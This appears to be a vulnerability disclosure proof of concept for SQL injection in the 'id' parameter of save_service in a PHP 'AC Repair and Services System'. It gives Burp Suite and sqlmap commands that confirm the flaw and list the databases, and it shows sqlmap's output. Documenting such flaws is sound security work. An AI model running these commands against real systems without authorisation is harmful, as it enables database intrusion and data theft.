---
slug: ac-repair-and-services-system-save_service
title: AC Repair and Services System (save_service)
---



## Details

### Related Code file: 
`/php-acrss/classes/Master.php?f=save_service`

## Injection parameter: 
`MULTIPART id`



&nbsp;



## POC

![1](https://github.com/user-attachments/assets/e5c336d1-3031-4a15-b3ab-d53826583bbd)

Intercept the request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/ed437380-7d6f-43f2-addf-4e18b9ff1bca)

Save request to `save_service.txt`.


### Verify vulnerability

```
sqlmap -r save_service.txt --batch
```

![53](https://github.com/user-attachments/assets/9268b9a4-6607-4d84-b471-5af29d6bc294)

![54](https://github.com/user-attachments/assets/207b22ff-5108-40be-8fb5-06ab89e583cf)

```
Parameter: MULTIPART id ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: -----------------------------300184230814216218473749183836
Content-Disposition: form-data; name="id"


    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------300184230814216218473749183836
Content-Disposition: form-data; name="id"
```


### Dump databases

```
sqlmap -r save_service.txt --batch -dbs
```

![55](https://github.com/user-attachments/assets/a4649e5c-932c-42c1-a7a3-8d9117623edd)

```
[13:01:15] [INFO] fetching database names
[13:01:15] [INFO] retrieved: 'information_schema'
[13:01:15] [INFO] retrieved: 'acrss'
available databases [2]:
[*] acrss
[*] information_schema
```
